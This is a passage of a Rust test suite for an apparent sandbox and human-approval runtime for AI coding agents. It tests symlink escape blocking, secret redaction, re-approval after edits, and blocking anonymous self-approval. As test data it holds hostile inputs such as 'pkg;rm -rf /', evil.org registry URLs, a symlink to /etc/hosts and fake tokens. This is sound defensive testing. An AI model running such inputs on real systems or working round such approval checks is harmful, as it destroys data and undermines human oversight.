            std::fs::read_to_string(env.sandbox.config().agent_home_dir.join("imports/docs/spec.md"))
                .unwrap(),
            "tampered bytes!"
        );
        // Host workspace and CoW shadow stay untouched in default `"imports"` mode!
        assert!(!env.workspace.shadow_root().join("docs/spec.md").exists());

        // 3. Explicit `import_to: "shadow"` lands inside CoW shadow after approval.
        let shadow_args = json!({
            "src_host_path": &spec_file,
            "import_to": "shadow",
            "dst_path": "ref/notes.md"
        });
        let ask_s = kernel
            .call_tool(&agent, "fs_import_file", shadow_args.clone())
            .await
            .unwrap();
        kernel
            .policy
            .approve_escalation(ask_s["escalation_id"].as_str().unwrap(), 0, "user")
            .await
            .unwrap();
        let done_s = kernel
            .call_tool(&agent, "fs_import_file", shadow_args)
            .await
            .unwrap();
        assert_eq!(done_s["import_to"], "shadow");
        assert_eq!(
            std::fs::read_to_string(env.workspace.shadow_root().join("ref/notes.md")).unwrap(),
            "tampered bytes!"
        );

        // 4. Symlinked subdirectory inside `<agent_home>/imports/` must never allow escaping imports_root.
        #[cfg(unix)]
        {
            let outside_escape = tmp.path().join("outside_escape");
            std::fs::create_dir_all(&outside_escape).unwrap();
            let imports_dir = env.sandbox.config().agent_home_dir.join("imports");
            std::fs::create_dir_all(&imports_dir).unwrap();
            std::os::unix::fs::symlink(&outside_escape, imports_dir.join("escape")).unwrap();
            let err = kernel
                .call_tool(
                    &agent,
                    "fs_import_file",
                    json!({
                        "src_host_path": &spec_file,
                        "import_to": "imports",
                        "dst_path": "escape/pwned.txt"
                    }),
                )
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("symlink"), "{err}");
            assert!(!outside_escape.join("pwned.txt").exists());
        }
    }

    #[tokio::test]
    async fn test_workspace_git_inspect_auto_commit_shadow_branch_and_cross_repo_guards() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let git_bin = resolve_system_git_binary().expect("system git required for test");
        let temp = tempfile::tempdir().unwrap();
        let origin_bare = temp.path().join("origin.git");
        let host_repo = temp.path().join("repo");
        let rt = temp.path().join("rt");

        assert!(std::process::Command::new(&git_bin)
            .args(["init", "--bare", origin_bare.to_str().unwrap()])
            .status()
            .unwrap()
            .success());
        std::fs::create_dir_all(&host_repo).unwrap();
        for cmd_args in [
            vec!["init", "-b", "main"],
            vec!["config", "user.name", "Tester"],
            vec!["config", "user.email", "tester@example.com"],
            vec![
                "remote",
                "add",
                "origin",
                "https://x-access-token:secretTok3n9999@github.com/heurion-org/aegis-os.git",
            ],
        ] {
            assert!(run_sanitized_host_git(
                &git_bin,
                &host_repo,
                &[],
                &cmd_args.into_iter().map(String::from).collect::<Vec<_>>()
            )
            .unwrap()
            .status
            .success());
        }
        std::fs::write(host_repo.join("README.md"), "init\n").unwrap();
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &["add".into(), "README.md".into()]
        )
        .unwrap()
        .status
        .success());
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &["commit".into(), "-m".into(), "init".into()]
        )
        .unwrap()
        .status
        .success());

        // Point actual remote URL to bare repo while keeping second remote `secret_remote` for DLP test.
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &[
                "remote".into(),
                "add".into(),
                "leak".into(),
                "https://x-access-token:secretTok3n9999@github.com/heurion-org/aegis-os.git".into(),
            ]
        )
        .unwrap()
        .status
        .success());
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &[
                "remote".into(),
                "set-url".into(),
                "origin".into(),
                origin_bare.to_str().unwrap().to_string(),
            ]
        )
        .unwrap()
        .status
        .success());

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "release-bot", "Release Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Write edits ONLY in CoW shadow (do NOT call `workspace_commit`).
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "src/new_feat.rs", "content": "pub fn feat() -> u32 { 42 }\n" }),
            )
            .await
            .unwrap();

        // Zero-prompt `workspace_git_inspect` reports pending shadow file count & scrubs remote URLs!
        let status = kernel
            .call_tool(&agent, "workspace_git_inspect", json!({ "mode": "status" }))
            .await
            .unwrap();
        assert_eq!(status["status"], "ok");
        assert!(
            status["shadow_uncommitted_files"]
                .as_array()
                .unwrap()
                .iter()
                .any(|v| v == "src/new_feat.rs"),
            "{status}"
        );
        let remotes = kernel
            .call_tool(&agent, "workspace_git_inspect", json!({ "mode": "remote" }))
            .await
            .unwrap();
        let rem_out = remotes["output"].as_str().unwrap();
        assert!(!rem_out.contains("secretTok3n9999"), "{rem_out}");
        assert!(rem_out.contains("[REDACTED_BY_AEGIS_DLP]"), "{rem_out}");

        // 2. Single-approval `workspace_git` with `auto_commit_shadow: true` + `verify_cmd` + `checkout_branch` + `push`!
        let tx_args = json!({
            "auto_commit_shadow": true,
            "verify_cmd": "test -f src/new_feat.rs",
            "checkout_branch": "feat/one-click",
            "create_branch": true,
            "commit_message": "feat: one-click shadow + git",
            "tag": "v0.9.0-test",
            "push": true,
            "remote": "origin"
        });
        let ask_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args.clone())
            .await
            .unwrap();
        assert_eq!(ask_tx["status"], "approval_required");
        let esc_tx = ask_tx["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc_tx, 0, "user").await.unwrap();

        // TOCTOU check: mutating CoW shadow after approval must invalidate the pinned OneShot lease.
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "src/new_feat.rs", "content": "pub fn evil() {}\n" }),
            )
            .await
            .unwrap();
        let drifted_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args.clone())
            .await
            .unwrap();
        assert_eq!(drifted_tx["status"], "approval_required");
        kernel
            .policy
            .approve_escalation(drifted_tx["escalation_id"].as_str().unwrap(), 0, "user")
            .await
            .unwrap();

        let done_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args)
            .await
            .unwrap();
        assert_eq!(done_tx["status"], "git_completed", "{done_tx}");
        assert_eq!(done_tx["verified_shadow"], true);
        assert_eq!(done_tx["checked_out_branch"], "feat/one-click");
        assert_eq!(done_tx["pushed"], true);
        assert!(host_repo.join("src/new_feat.rs").is_file());

        // Verify bare remote received `refs/heads/feat/one-click` and `refs/tags/v0.9.0-test`.
        let show_ref = run_sanitized_host_git(&git_bin, &origin_bare, &[], &["show-ref".into()])
            .unwrap();
        let refs_txt = String::from_utf8_lossy(&show_ref.stdout);
        assert!(refs_txt.contains("refs/heads/feat/one-click"), "{refs_txt}");
        assert!(refs_txt.contains("refs/tags/v0.9.0-test"), "{refs_txt}");

        // 3. `force_push: true` triggers `workspace_git_sensitive` escalation (HIGH RISK).
        let force_args = json!({ "push": true, "force_push": true, "branch": "feat/one-click" });
        let ask_fp = kernel
            .call_tool(&agent, "workspace_git", force_args)
            .await
            .unwrap();
        assert_eq!(ask_fp["status"], "approval_required");
        assert!(
            ask_fp["reason"].as_str().unwrap().contains("force_push"),
            "{ask_fp}"
        );

        // 4. `github_ci_inspect` with non-GitHub origin (bare path) triggers cross-repo escalation;
        //    `github_pr_create` blocks secret patterns via DLP BEFORE creating an escalation.
        let ask_ci = kernel
            .call_tool(&agent, "github_ci_inspect", json!({ "repo": "heurion-org/aegis-os" }))
            .await
            .unwrap();
        assert_eq!(ask_ci["status"], "approval_required", "{ask_ci}");

        let dlp_err = kernel
            .call_tool(
                &agent,
                "github_pr_create",
                json!({
                    "repo": "heurion-org/aegis-os",
                    "title": "fix auth",
                    "body": "accidentally pasted ghp_1234567890abcdefghijklmnop"
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(dlp_err.contains("DLP policy"), "{dlp_err}");
    }

    #[tokio::test]
    async fn test_pkg_install_validation_pinning_and_host_symlink_isolation() {
        use std::os::unix::fs::PermissionsExt;

        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let tmp = tempfile::tempdir().unwrap();
        let rt = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        std::fs::create_dir_all(host_proj.join("node_modules/.bin")).unwrap();
        std::fs::write(host_proj.join("package.json"), r#"{"name":"demo","version":"1.0.0"}"#).unwrap();

        let fake_npm = host_proj.join("node_modules/.bin/npm");
        std::fs::write(
            &fake_npm,
            "#!/bin/sh\nset -eu\necho \"$*\" > .npm_invoked_args.txt\nmkdir -p node_modules/fake-pkg\necho 'exports.ok = true;' > node_modules/fake-pkg/index.js\n",
        )
        .unwrap();
        std::fs::set_permissions(&fake_npm, std::fs::Permissions::from_mode(0o755)).unwrap();

        let kernel = AegisRuntimeKernel::new(&rt).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agy-agent", "Engineer");
        let env = kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();

        // Shadow initially symlinks host `node_modules`.
        assert!(
            std::fs::symlink_metadata(env.workspace.shadow_root().join("node_modules"))
                .unwrap()
                .file_type()
                .is_symlink()
        );

        // 1. Unsafe package specifiers / URLs / flags are rejected pre-escalation.
        for bad in ["--registry=https://evil.org", "https://evil.org/pkg.tgz", "pkg;rm -rf /", "../escape"] {
            let err = kernel
                .call_tool(
                    &agent,
                    "pkg_install",
                    json!({ "manager": "npm", "packages": [bad], "offline": true }),
                )
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("Invalid or unsafe package specifier"), "{bad}: {err}");
        }
        let go_bad = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "go", "packages": ["localpkg"], "offline": true }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(go_bad.contains("qualified domain module path"), "{go_bad}");
        let go_rel = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "go", "packages": ["./localpkg"], "offline": true }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(go_rel.contains("Invalid or unsafe package specifier"), "{go_rel}");

        // 2. `allow_scripts: true` escalates to `pkg_install_scripts`.
        let ask_scripts = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "npm", "packages": ["fake-pkg"], "allow_scripts": true, "offline": true }),
            )
            .await
            .unwrap();
        assert_eq!(ask_scripts["status"], "approval_required");
        assert!(ask_scripts["reason"].as_str().unwrap().contains("LIFECYCLE SCRIPTS"));

        // 3. Safe install (`allow_scripts: false`, `offline: true`) pins `#sha256:` & detects TOCTOU drift.
        let args = json!({
            "manager": "npm",
            "packages": ["fake-pkg"],
            "allow_scripts": false,
            "offline": true
        });
        let ask_ok = kernel.call_tool(&agent, "pkg_install", args.clone()).await.unwrap();
        assert_eq!(ask_ok["status"], "approval_required");
        let esc1 = ask_ok["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc1, 0, "user").await.unwrap();

        std::fs::write(
            env.workspace.shadow_root().join("package.json"),
            r#"{"name":"demo","version":"1.0.1"}"#,
        )
        .unwrap();
        let drifted = kernel.call_tool(&agent, "pkg_install", args.clone()).await.unwrap();
        assert_eq!(
            drifted["status"], "approval_required",
            "Manifest mutation after approval must invalidate pinned lease: {drifted}"
        );

        let esc2 = drifted["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc2, 0, "user").await.unwrap();
        let res = kernel.call_tool(&agent, "pkg_install", args).await.unwrap();
        assert_eq!(res["status"], "pkg_installed", "{res}");
        assert_eq!(res["host_modified"], false);

        // Verify shadow `node_modules` was unlinked from host symlink & host repo stayed untouched.
        assert!(
            !std::fs::symlink_metadata(env.workspace.shadow_root().join("node_modules"))
                .unwrap()
                .file_type()
                .is_symlink(),
            "shadow node_modules must no longer be a host symlink after install"
        );
        assert!(env
            .workspace
            .shadow_root()
            .join("node_modules/fake-pkg/index.js")
            .is_file());
        assert!(!host_proj.join("node_modules/fake-pkg").exists());
        let invoked = std::fs::read_to_string(
            env.workspace.shadow_root().join(".npm_invoked_args.txt"),
        )
        .unwrap();
        assert!(invoked.contains("--ignore-scripts"), "{invoked}");
        assert!(invoked.contains("--offline"), "{invoked}");
        assert!(invoked.contains("fake-pkg"), "{invoked}");
    }

    #[tokio::test]
    async fn test_github_comment_pr_merge_dlp_pinning_and_structured_evidence() {
        let temp = tempfile::tempdir().unwrap();
        let host_proj = temp.path().join("gh_proj");
        std::fs::create_dir_all(host_proj.join(".git")).unwrap();
        std::fs::write(
            host_proj.join(".git/config"),
            "[remote \"origin\"]\n\turl = git@github.com:heurion-org/demo-repo.git\n",
        )
        .unwrap();
        std::fs::write(host_proj.join("README.md"), "# Demo\n").unwrap();

        let kernel = AegisRuntimeKernel::new(temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agy-agent", "Coder");
        kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();

        // 1. DLP blocks leaked secrets in comment body & PR merge subject/body
        let bad_comment = kernel
            .call_tool(
                &agent,
                "github_comment_create",
                json!({ "number": 12, "body": "Token ghp_RealSecretToken1234567890abcdef" }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(bad_comment.contains("DLP policy"), "{bad_comment}");

        let bad_merge = kernel
            .call_tool(
                &agent,
                "github_pr_merge",
                json!({
                    "pr_number": 12,
                    "method": "squash",
                    "subject": "Merge PR with AKIAIOSFODNN7EXAMPLE"
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(bad_merge.contains("DLP policy"), "{bad_merge}");

        // 2. github_comment_create populates PendingEscalation.evidence and #sha256: pins
        let ask_comment = kernel
            .call_tool(
                &agent,
                "github_comment_create",
                json!({ "number": 12, "body": "Verified CI pass." }),
            )
            .await
            .unwrap();
        assert_eq!(ask_comment["status"], "approval_required");
        let esc_c = ask_comment["escalation_id"].as_str().unwrap().to_string();
        let escalations = kernel.policy.list_escalations("aegis-os").await.unwrap();
        let rec_c = escalations.iter().find(|e| e.escalation_id == esc_c).unwrap();
        let ev_c = rec_c.evidence.as_ref().expect("comment escalation must include evidence");
        assert_eq!(ev_c["repo"], "heurion-org/demo-repo");
        assert_eq!(ev_c["number"], 12);
        let lease_c = kernel.policy.approve_escalation(&esc_c, 0, "user").await.unwrap();
        assert!(lease_c.resource_pattern.contains("#sha256:"));

        // 3. github_pr_merge populates structured evidence
        let ask_merge = kernel
            .call_tool(
                &agent,
                "github_pr_merge",
                json!({ "pr_number": 12, "method": "squash", "delete_branch": true }),
            )
            .await
            .unwrap();
        assert_eq!(ask_merge["status"], "approval_required");
        let esc_m = ask_merge["escalation_id"].as_str().unwrap().to_string();
        let escalations = kernel.policy.list_escalations("aegis-os").await.unwrap();
        let rec_m = escalations.iter().find(|e| e.escalation_id == esc_m).unwrap();
        let ev_m = rec_m.evidence.as_ref().expect("merge escalation must include evidence");
        assert_eq!(ev_m["pr_number"], 12);
        assert_eq!(ev_m["method"], "squash");
        assert_eq!(ev_m["delete_branch"], true);

        // 4. Web approval templates render structured cards and forbid emojis on dashboard
        assert!(approver::APPROVE_PAGE_HTML.contains("pkg_install_scripts"));
        assert!(approver::APPROVE_PAGE_HTML.contains("host_exec"));
        assert!(approver::APPROVE_PAGE_HTML.contains("github_pr_merge"));
        assert!(approver::APPROVE_PAGE_HTML.contains("isHighRisk"));
        let dash = paas::render_dashboard_html(&host_proj);
        assert!(dash.contains("pkg_install_scripts"));
        assert!(dash.contains("github_pr_merge"));
        assert!(dash.contains("isHighRisk"));
        assert!(!dash.chars().any(|c| ('\u{1F300}'..='\u{1FAFF}').contains(&c)));
    }

    #[tokio::test]
    async fn test_mcp_tools_list_and_prompts_never_trigger_egress_dlp() {
        let rt = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(rt.path()).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-1", "Engineer");
        let resp = kernel
            .handle_jsonrpc_message(
                &agent,
                json!({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/list",
                    "params": {}
                }),
            )
            .await
            .unwrap();
        let raw = serde_json::to_string(&resp).unwrap();
        let hits = aos_egress::detect_dlp_patterns(&raw);
        assert!(
            hits.is_empty(),
            "tools/list schema must never trigger outbound DLP: {hits:?}"
        );
        assert_eq!(
            aos_egress::AegisEgressGateway::inspect_payload_dlp(&raw, &[], "acme"),
            None,
            "inspect_payload_dlp must allow tools/list schema in LLM /v1/messages body"
        );
    }

    #[tokio::test]
    async fn test_host_exec_frozen_bundle_ttl_hash_pinning_env_scrub_killpg_and_output_harvest() {
        let rt = tempfile::tempdir().unwrap();
        let host_proj = tempfile::tempdir().unwrap();
        let host_home = tempfile::tempdir().unwrap();
        let session_dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(host_proj.path().join("scripts")).unwrap();
        std::fs::write(
            host_proj.path().join("scripts/helper.py"),
            "MARKER = 'v1-ok'\n",
        )
        .unwrap();
        std::fs::write(
            host_proj.path().join("scripts/bench_probe.py"),
            r#"import json, os
from pathlib import Path

helper_txt = Path(__file__).with_name("helper.py").read_text()
# Verify env_clear stripped all Rust/cargo/session control env vars and left only clean minimal env.
leaked = [k for k in os.environ if k.startswith(("CARGO_", "RUSTUP_", "AOS_SESSION", "AOS_CONTROL", "AOS_SANDBOX", "OPENAI_", "ANTHROPIC_"))]
print("HELPER:", helper_txt.strip())
print("CLEAN_ENV:", len(leaked) == 0, "SAFE_PATH:", os.environ.get("PYTHONSAFEPATH"))
# Emit a synthetic secret + operator token candidate to verify DLP scrubbing before returning to LLM.
print("LEAK_TEST:", "ghp_1234567890abcdefghijklmnoprstuv")
Path("reports").mkdir(exist_ok=True)
Path("reports/out.json").write_text(json.dumps({"helper": "v1-ok", "leaked": leaked}))
"#,
        )
        .unwrap();

        let kernel = AegisRuntimeKernel::new(rt.path()).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agy-agent", "Coder");
        let cow = CoWWorkspace::init(host_proj.path(), rt.path().join("cow_host_exec"))
            .await
            .unwrap();
        let shadow_root = cow.shadow_root().to_path_buf();
        let sbx_home = rt.path().join("sbx_home");
        std::fs::create_dir_all(&sbx_home).unwrap();
        let sandbox = NativeOsSandboxDriver
            .create_sandbox(SandboxConfig {
                identity: agent.clone(),
                tier: IsolationTier::NativeOsSandbox,
                limits: ResourceLimits::default(),
                workspace_dir: shadow_root.clone(),
                agent_home_dir: sbx_home,
                org_shared_ro_dir: rt.path().join("ro"),
                org_agent_pub_dir: rt.path().join("pub"),
                egress_proxy_addr: None,
                host_source_dir: Some(host_proj.path().to_path_buf()),
                tighten_home_read: true,
                allowed_loopback_ports: Vec::new(),
                isolate_loopback_only: true,
            })
            .await
            .unwrap();
        kernel
            .attach_agent_environment(
                &agent,
                AgentEnvironment {
                    identity: agent.clone(),
                    workspace: Arc::new(cow),
                    sandbox,
                },
            )
            .await;

        // 1. Without HostExecBrokerConfig (Advisory mode), `host_exec` must be refused.
        let non_broker_err = kernel
            .call_tool(
                &agent,
                "host_exec",
                json!({ "program": "python3", "script": "scripts/bench_probe.py" }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(non_broker_err.contains("enforced Aegis OS"), "{non_broker_err}");

        // Attach SessionBroker HostExecBrokerConfig.
        kernel
            .set_host_exec_config(HostExecBrokerConfig {
                session_dir: session_dir.path().to_path_buf(),
                host_home: host_home.path().to_path_buf(),
                clean_host_path: "/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin".to_string(),
                host_workspace_root: host_proj.path().to_path_buf(),
                on_run_finished: None,
            })
            .await;

        // 2. Reject inline `-c` code, symlink inputs, secret `pass_env`, and sensitive `output_files`.
        assert!(kernel
            .call_tool(
                &agent,
                "host_exec",
                json!({ "program": "python3", "script": "scripts/bench_probe.py", "args": ["-c", "print(1)"] }),
            )
            .await
            .is_err());
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink("/etc/hosts", shadow_root.join("scripts/sym_link.txt")).unwrap();
            let sym_err = kernel
                .call_tool(
                    &agent,
                    "host_exec",
                    json!({
                        "program": "python3",
                        "script": "scripts/bench_probe.py",
                        "inputs": ["scripts/sym_link.txt"]
                    }),
                )
                .await
                .unwrap_err()
                .to_string();
            assert!(sym_err.contains("symlink"), "{sym_err}");
            let _ = std::fs::remove_file(shadow_root.join("scripts/sym_link.txt"));
        }
        assert!(kernel
            .call_tool(
                &agent,
                "host_exec",
                json!({
                    "program": "python3",
                    "script": "scripts/bench_probe.py",
                    "pass_env": ["OPENAI_API_KEY"]
                }),
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "host_exec",
                json!({
                    "program": "python3",
                    "script": "scripts/bench_probe.py",
                    "output_files": [".git/hooks/pre-commit"]
                }),
            )
            .await
            .is_err());

        // 3. First valid request returns `approval_required` with frozen bundle SHA-256 & diff preview.
        let valid_args = json!({
            "program": "python3",
            "script": "scripts/bench_probe.py",
            "inputs": ["scripts/helper.py"],
            "output_files": ["reports/out.json"],
            "rationale": "Run unconfounded probe"
        });
        let ask = kernel.call_tool(&agent, "host_exec", valid_args.clone()).await.unwrap();
        assert_eq!(ask["status"], "approval_required", "{ask}");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
        let ev_hash = ask["evidence_hash"].as_str().unwrap().to_string();
        let diff_file = rt.path().join("escalation_diffs").join(format!("{esc_id}.json"));
        let diff_txt = std::fs::read_to_string(&diff_file).unwrap();
        assert!(diff_txt.contains(".aegis/HOST_EXEC_MANIFEST"), "{diff_txt}");
        assert!(diff_txt.contains("scripts/bench_probe.py"), "{diff_txt}");
        assert!(diff_txt.contains("scripts/helper.py"), "{diff_txt}");

        // Approve with 3600s TTL -> verify execution, env cleanliness, DLP redaction, and output harvest.
        kernel.policy.approve_escalation(&esc_id, 3600, "human").await.unwrap();
        let run1 = kernel.call_tool(&agent, "host_exec", valid_args.clone()).await.unwrap();
        assert_eq!(run1["status"], "completed", "{run1}");
        assert_eq!(run1["exit_code"], 0, "{run1}");
        let stdout1 = run1["stdout"].as_str().unwrap();
        assert!(stdout1.contains("HELPER: MARKER = 'v1-ok'"), "{stdout1}");
        assert!(stdout1.contains("CLEAN_ENV: True SAFE_PATH: 1"), "{stdout1}");
        assert!(!stdout1.contains("ghp_1234567890"), "{stdout1}");
        assert!(stdout1.contains("[REDACTED_BY_AEGIS_DLP]"), "{stdout1}");
        let harvested_txt = std::fs::read_to_string(shadow_root.join("reports/out.json")).unwrap();
        assert!(harvested_txt.contains("\"helper\": \"v1-ok\""), "{harvested_txt}");

        // Identical rerun succeeds under 3600s TTL lease.
        let run2 = kernel.call_tool(&agent, "host_exec", valid_args.clone()).await.unwrap();
        assert_eq!(run2["status"], "completed", "{run2}");
        assert_eq!(run2["evidence_hash"].as_str().unwrap(), ev_hash);

        // Mutating 1 byte of frozen dependency immediately invalidates the TTL lease!
        std::fs::write(shadow_root.join("scripts/helper.py"), "MARKER = 'v2-ok'\n").unwrap();
        let drift_ask = kernel.call_tool(&agent, "host_exec", valid_args).await.unwrap();
        assert_eq!(
            drift_ask["status"],
            "approval_required",
            "1-byte edit must force re-approval: {drift_ask}"
        );

        // 4. Timeout reaps the entire grandchild process group via killpg(SIGKILL).
        #[cfg(unix)]
        {
            std::fs::write(
                shadow_root.join("scripts/sleeper.py"),
                r#"import subprocess, time
from pathlib import Path
p = subprocess.Popen(["sleep", "60"])
Path("reports").mkdir(exist_ok=True)
Path("reports/child_pid.txt").write_text(str(p.pid))
time.sleep(60)
"#,
            )
            .unwrap();
            let sleep_args = json!({
                "program": "python3",
                "script": "scripts/sleeper.py",
                "output_files": ["reports/child_pid.txt"],
                "timeout_ms": 1_000
            });
            let sleep_ask = kernel.call_tool(&agent, "host_exec", sleep_args.clone()).await.unwrap();
            let sleep_esc = sleep_ask["escalation_id"].as_str().unwrap();
            kernel.policy.approve_escalation(sleep_esc, 0, "human").await.unwrap();
            let sleep_res = kernel.call_tool(&agent, "host_exec", sleep_args).await.unwrap();
            assert_eq!(sleep_res["status"], "timed_out", "{sleep_res}");
            let pid_str = std::fs::read_to_string(shadow_root.join("reports/child_pid.txt")).unwrap();
            let child_pid: i32 = pid_str.trim().parse().unwrap();
            let mut terminated = false;
            for _ in 0..15 {
                let alive = unsafe { libc::kill(child_pid, 0) } == 0;
                let linux_zombie = std::fs::read_to_string(format!("/proc/{child_pid}/stat"))
                    .map(|s| s.contains(") Z "))
                    .unwrap_or(false);
                if !alive || linux_zombie {
                    terminated = true;
                    break;
                }
                tokio::time::sleep(std::time::Duration::from_millis(50)).await;
            }
            assert!(terminated, "grandchild sleep pid {} must be killed by killpg", child_pid);
        }
    }

    #[tokio::test]
    async fn test_local_ui_token_blocks_anonymous_loopback_self_approval_and_locks_during_host_exec() {
        let rt = tempfile::tempdir().unwrap();
        let proj = tempfile::tempdir().unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(rt.path()).await.unwrap());
        let bind_addr = match std::env::var("AOS_DEV_PORT") {
            Ok(p) if !p.trim().is_empty() => format!("127.0.0.1:{}", p.trim()),
            _ => "127.0.0.1:0".to_string(),
        };
        let addr = match kernel
            .clone()
            .start_http_daemon_with_auth(&bind_addr, proj.path().to_path_buf(), DaemonAuth::Required)
            .await
        {
            Ok(a) => a,
            Err(_) => kernel
                .clone()
                .start_http_daemon_with_auth("127.0.0.1:0", proj.path().to_path_buf(), DaemonAuth::Required)
                .await
                .unwrap(),
        };

        let agent = AgentIdentity::new("acme", "coder-1", "Engineer");
        let esc1 = match kernel
            .policy
            .evaluate(&PolicyContext {
                principal: agent.clone(),
                action: "workspace_commit".to_string(),
                target_org_id: "acme".to_string(),
                target_resource: "/workspace/foo.rs".to_string(),
                metadata: json!({ "paths": ["foo.rs"] }),
            })
            .await
            .unwrap()
        {
            PolicyDecision::Ask { escalation_id, .. } => escalation_id,
            other => panic!("expected Ask, got {other:?}"),
        };

        // Anonymous loopback POST /v1/approvals/decide MUST be rejected with 403 Forbidden!
        let (head_anon, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            None,
            Some(json!({ "escalation_id": esc1, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(head_anon.contains("403 Forbidden"), "{head_anon}");

        // Active host_exec run locks POST /v1/approvals/decide with 423 Locked even with operator token!
        let op_tok = kernel.operator_token();
        assert!(!op_tok.is_empty());
        kernel
            .active_host_exec_runs
            .fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let (head_locked, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op_tok),
            Some(json!({ "escalation_id": esc1, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(head_locked.contains("423 Locked"), "{head_locked}");
        kernel
            .active_host_exec_runs
            .fetch_sub(1, std::sync::atomic::Ordering::SeqCst);

        // Once unlocked and presented with valid operator token (from browser #key=), approval succeeds.
        let (head_ok, body_ok) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op_tok),
            Some(json!({ "escalation_id": esc1, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(head_ok.contains("200 OK"), "{head_ok}: {body_ok}");
        assert_eq!(body_ok["status"], "approved", "{body_ok}");
    }

    #[tokio::test]
    async fn test_http_control_plane_auth_and_scoped_ticket_isolation() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let outbox = temp.path().join("outbox");
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        kernel.paas.set_mailer(
            approver::Mailer::Directory(outbox.clone()),
            "https://cloud.example",
        );
        let addr = kernel
            .clone()
            .start_http_daemon_with_auth("127.0.0.1:0", repo.clone(), DaemonAuth::Required)
            .await
            .unwrap();
        let op = kernel.operator_token();

        // Anonymous callers are rejected on protected status, diff, revoke, and approver endpoints
        for (m, path) in [
            ("GET", "/v1/status"),
            ("GET", "/api/status"),
            ("GET", "/v1/approvals/diff?escalation_id=esc-1"),
            ("GET", "/v1/approver?org_id=org-a"),
            ("POST", "/v1/approver/email"),
            ("POST", "/v1/leases/revoke"),
        ] {
            let (head, _) = raw_http(addr, m, path, None, Some(json!({}))).await;
            assert!(
                head.contains("401 Unauthorized"),
                "expected 401 on anonymous {m} {path}, got: {head}"
            );
        }

        // Provision org-a key & TOTP approver, plus org-b key & escalation
        let (_k_a, _) = kernel
            .paas
            .issue_api_key("org-a", "coder-a", "Engineer", None, "test-a")
            .await
            .unwrap();
        let (_k_b, _) = kernel
            .paas
            .issue_api_key("org-b", "coder-b", "Engineer", None, "test-b")
            .await
            .unwrap();
        // Existing org must reject unauthenticated billing checkout
        let (chk_head, chk_body) = raw_http(
            addr,
            "POST",
            "/v1/billing/checkout",
            None,
            Some(json!({ "org_id": "org-a", "plan_tier": "pro" })),
        )
        .await;
        assert!(chk_head.contains("403 Forbidden"), "{chk_head}: {chk_body}");

        kernel
            .paas
            .request_approver_email_enrollment("org-a", "lead@orga.dev")
            .await
            .unwrap();
        let mail = std::fs::read_dir(&outbox).unwrap().next().unwrap().unwrap().path();
        let enroll_tok = std::fs::read_to_string(mail)
            .unwrap()
            .split("token=")
            .nth(1)
            .unwrap()
            .split_whitespace()
            .next()
            .unwrap()
            .to_string();
        let enrolled = kernel
            .paas
            .confirm_approver_email_enrollment(&enroll_tok)
            .await
            .unwrap();
        let secret_hex = enrolled["secret"].as_str().unwrap().to_string();

        kernel
            .ensure_agent_environment(
                AgentIdentity::new("org-a", "coder-a", "Engineer"),
                &repo,
